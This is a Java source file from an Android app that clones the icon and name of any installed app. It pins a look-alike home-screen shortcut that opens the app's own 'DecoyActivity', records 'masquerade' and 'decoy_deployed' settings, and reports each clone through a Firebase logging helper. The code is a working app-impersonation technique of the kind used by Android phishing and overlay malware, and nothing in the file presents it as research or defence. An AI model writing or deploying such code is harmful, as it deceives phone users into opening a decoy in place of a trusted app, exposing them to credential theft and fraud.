package com.labs.labrats;

import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.ShortcutInfo;
import android.content.pm.ShortcutManager;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.graphics.drawable.Icon;
import android.os.Build;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;

public class ClonedIconManager {

    private static final String TAG = "ClonedIconManager";

    /**
     * Extracts and caches the high-resolution app icon bitmap for any package ID.
     */
    public static File cacheAppIcon(Context context, String packageName) {
        try {
            PackageManager pm = context.getPackageManager();
            ApplicationInfo appInfo = pm.getApplicationInfo(packageName, 0);
            Drawable drawable = appInfo.loadIcon(pm);

            Bitmap bitmap;
            if (drawable instanceof BitmapDrawable) {
                bitmap = ((BitmapDrawable) drawable).getBitmap();
            } else {
                int width = Math.max(1, drawable.getIntrinsicWidth());
                int height = Math.max(1, drawable.getIntrinsicHeight());
                bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
                Canvas canvas = new Canvas(bitmap);
                drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
                drawable.draw(canvas);
            }

            File dir = new File(context.getFilesDir(), "cloned_icons");
            if (!dir.exists()) dir.mkdirs();

            File iconFile = new File(dir, packageName + ".png");
            try (FileOutputStream fos = new FileOutputStream(iconFile)) {
                bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
            }

            Log.d(TAG, "Cached cloned icon bitmap for package: " + packageName);
            return iconFile;
        } catch (Exception e) {
            Log.e(TAG, "Error caching icon for " + packageName + ": " + e.getMessage());
            return null;
        }
    }

    /**
     * Dynamically pins a home screen launcher shortcut using the exact extracted bitmap icon of any app.
     */
    public static boolean cloneAndPinApp(Context context, String packageName) {
        try {
            PackageManager pm = context.getPackageManager();
            ApplicationInfo appInfo = pm.getApplicationInfo(packageName, 0);
            String appLabel = appInfo.loadLabel(pm).toString();

            // Cache dynamic icon
            cacheAppIcon(context, packageName);

            // Save active masquerade target for passthrough
            context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                    .edit()
                    .putString("masquerade_pkg", packageName)
                    .putString("masquerade_name", appLabel)
                    .putBoolean("decoy_deployed", true)
                    .apply();

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ShortcutManager shortcutManager = context.getSystemService(ShortcutManager.class);
                if (shortcutManager != null && shortcutManager.isRequestPinShortcutSupported()) {
                    Drawable drawable = appInfo.loadIcon(pm);
                    Bitmap bitmap;
                    if (drawable instanceof BitmapDrawable) {
                        bitmap = ((BitmapDrawable) drawable).getBitmap();
                    } else {
                        int width = Math.max(1, drawable.getIntrinsicWidth());
                        int height = Math.max(1, drawable.getIntrinsicHeight());
                        bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
                        Canvas canvas = new Canvas(bitmap);
                        drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
                        drawable.draw(canvas);
                    }

                    Intent launchIntent = new Intent(context, DecoyActivity.class);
                    launchIntent.setAction(Intent.ACTION_MAIN);
                    launchIntent.putExtra("masquerade_pkg", packageName);

                    ShortcutInfo shortcut = new ShortcutInfo.Builder(context, "cloned_" + packageName)
                            .setShortLabel(appLabel)
                            .setLongLabel(appLabel)
                            .setIcon(Icon.createWithBitmap(bitmap))
                            .setIntent(launchIntent)
                            .build();

                    shortcutManager.requestPinShortcut(shortcut, null);
                    FirebaseConfig.logActivity("CLONED_ICON_PINNED: Dynamic bitmap shortcut created for " + appLabel + " (" + packageName + ")");
                    return true;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error cloning app " + packageName + ": " + e.getMessage());
        }
        return false;
    }
}
